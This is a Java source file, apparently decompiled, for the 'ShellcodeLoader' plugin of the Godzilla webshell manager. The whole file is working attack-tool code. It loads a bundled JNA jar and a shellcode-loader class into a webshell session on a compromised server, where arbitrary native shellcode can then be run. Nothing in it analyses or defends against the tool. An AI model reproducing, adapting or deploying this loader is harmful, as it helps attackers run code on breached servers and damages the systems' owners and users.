package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.io.InputStream;
import shells.plugins.generic.ShellcodeLoader;
import util.Log;
import util.functions;
























@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "ShellcodeLoader", DisplayName = "ShellcodeLoader")
public class ShellcodeLoader
  extends ShellcodeLoader
{
  private static final String CLASS_NAME = "plugin.ShellcodeLoader";
  private JarLoader jarLoader;
  
  private boolean loadJar(byte[] jar) {
    if (this.jarLoader == null) {
      try {
        if (this.jarLoader == null) {
          ShellManage shellManage = this.shellEntity.getFrame();
          this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
        } 
      } catch (Exception e) {
        GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no find plugin JarLoader!");
        return false;
      } 
    }
    return this.jarLoader.loadJar(jar);
  }



  
  public boolean load() {
    if (!this.loadState) {
      try {
        InputStream inputStream = getClass().getResourceAsStream("assets/ShellcodeLoader.classs");
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        inputStream = getClass().getResourceAsStream("assets/GodzillaJna.jar");
        byte[] jar = functions.readInputStream(inputStream);
        inputStream.close();
        if (loadJar(jar)) {
          Log.log(String.format("LoadJar : %s", new Object[] { Boolean.valueOf(true) }), new Object[0]);
          this.loadState = this.payload.include("plugin.ShellcodeLoader", data);
        } 
      } catch (Exception e) {
        Log.error(e);
        GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
      } 
    }
    
    return this.loadState;
  }

  
  public String getClassName() {
    return "plugin.ShellcodeLoader";
  }
}
